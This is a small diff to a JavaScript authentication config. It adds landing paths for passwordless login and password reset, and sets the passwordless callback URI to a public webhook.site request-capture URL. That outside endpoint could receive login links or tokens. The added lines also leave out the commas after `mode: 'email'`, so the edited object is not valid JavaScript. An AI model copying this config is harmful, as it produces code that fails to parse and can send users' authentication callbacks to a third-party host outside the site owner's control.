@@ -36,6 +36,8 @@ module.exports = {
             passwordless: {
                 enabled: false,
                 mode: 'email'
+                callbackURI: 'https://webhook.site/27761b71-50c1-4097-a600-21a3b89a546c',
+                landingPath: '/passwordless-login-landing'
             },
             social: {
                 enabled: false,
@@ -43,6 +45,7 @@ module.exports = {
             },
             resetPassword: {
                 mode: 'email'
+                landingPath: '/reset-password-landing'
             }
         },
         siteAliases: {
